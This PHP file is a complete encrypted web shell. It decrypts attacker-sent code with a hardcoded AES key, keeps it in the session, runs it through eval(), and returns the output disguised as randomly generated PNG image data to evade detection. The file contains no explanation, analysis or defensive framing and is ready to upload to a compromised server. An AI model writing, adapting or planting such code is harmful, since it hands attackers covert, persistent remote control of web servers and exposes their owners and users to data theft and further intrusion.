<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);



function aes128($data,$mode){$result="";$blocksize=16;$key=base64_decode("gB2QhwWSDHIX2UT7rJjlhA==");if($mode==1){$pad=$blocksize -(strlen($data)% $blocksize);$data .=str_repeat(chr($pad), $pad);}if(function_exists("openssl_encrypt")){if($mode==1){$result=openssl_encrypt($data,"AES-128-ECB",$key,OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING);}else{$result=openssl_decrypt($data,"AES-128-ECB",$key,OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING);}}else if(function_exists("mcrypt_encrypt")){if($mode==1){$result=mcrypt_encrypt("rijndael-128", $key, $data, "ecb", "");}else{$result=mcrypt_decrypt("rijndael-128", $key, $data, "ecb", "");}}if($mode==2){$pad=ord($result[strlen($result)-1]);if($pad > strlen($result))return false;if(strspn($result, chr($pad), strlen($result)- $pad)!=$pad)return false;$result=substr($result, 0, -1 * $pad);}return $result;}function pngIdatChunk($data){$z=gzcompress($data,1+mt_rand(0,8));$pixels=max(1,intval(strlen($data)/4));$w=max(1,intval(sqrt($pixels))+mt_rand(0,2));$h=max(1,intval(ceil($pixels/$w)));$out="\x89PNG\r\n\x1a\n";$ihdr=pack("NNCCCCC",$w,$h,8,6,0,0,0);$out.=pack("N",13)."IHDR".$ihdr.pack("N",crc32("IHDR".$ihdr));if(mt_rand(0,1)){$g="\x00\x00\xb1\x8f";$out.=pack("N",4)."gAMA".$g.pack("N",crc32("gAMA".$g));}$parts=1;if(strlen($z)>0){$parts=1+mt_rand(0,min(3,strlen($z))-1);}$start=0;for($i=0;$i<$parts;$i++){if($i==$parts-1){$end=strlen($z);}else{$remain=strlen($z)-$start-($parts-$i-1);$end=$start+1+mt_rand(0,max(0,$remain-1));}$part=substr($z,$start,$end-$start);$out.=pack("N",strlen($part))."IDAT".$part.pack("N",crc32("IDAT".$part));$start=$end;}$ks=array("Comment","Software","Source","Author");$tn=mt_rand(0,2);for($i=0;$i<$tn;$i++){$t=$ks[mt_rand(0,3)]."\x00".dechex(mt_rand()).dechex(mt_rand());$out.=pack("N",strlen($t))."tEXt".$t.pack("N",crc32("tEXt".$t));}$out.=pack("N",0)."IEND".pack("N",crc32("IEND"));return $out;}







$requestData = file_get_contents("php://input");
if($requestData !== false && strlen($requestData) > 0){
    $requestData = pack("H*",$requestData);$requestData = aes128($requestData, 2);
    $payloadName="xgsu74MLF";
    if (isset($_SESSION[$payloadName])){
        $payload=base64_decode($_SESSION[$payloadName]);
        eval($payload);
        $responseData = @run($requestData);
        $responseData = base64_encode($responseData);$responseData=pngIdatChunk($responseData);
        header("HTTP/1.1 200 OK");header("Content-Type: image/png");echo $responseData;
    }else{
        $_SESSION[$payloadName] = base64_encode($requestData);
    }
}
